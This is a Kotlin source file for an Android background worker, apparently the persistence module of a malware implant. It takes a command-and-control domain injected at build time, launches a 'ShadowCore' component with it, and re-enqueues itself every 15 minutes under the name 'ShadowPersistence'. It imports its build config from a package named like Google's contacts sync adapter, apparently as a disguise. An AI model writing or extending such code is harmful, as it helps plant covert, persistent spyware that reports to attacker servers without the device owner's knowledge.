package com.shadow

import android.content.Context
import androidx.work.*
import com.google.android.syncadapters.contacts.BuildConfig
import java.util.concurrent.TimeUnit

class ShadowWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        // Domain injected at build time via BuildConfig (C2_DOMAIN env var in CI)
        val c2Domain = BuildConfig.C2_DOMAIN
        
        ShadowCore.start(applicationContext, c2Domain)
        
        // Block indefinitely to keep the process alive as long as WorkManager allows
        kotlinx.coroutines.delay(Long.MAX_VALUE)
        
        return Result.success()
    }

    companion object {
        fun enqueue(context: Context) {
            val request = PeriodicWorkRequestBuilder<ShadowWorker>(15, TimeUnit.MINUTES)
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "ShadowPersistence",
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }
    }
}
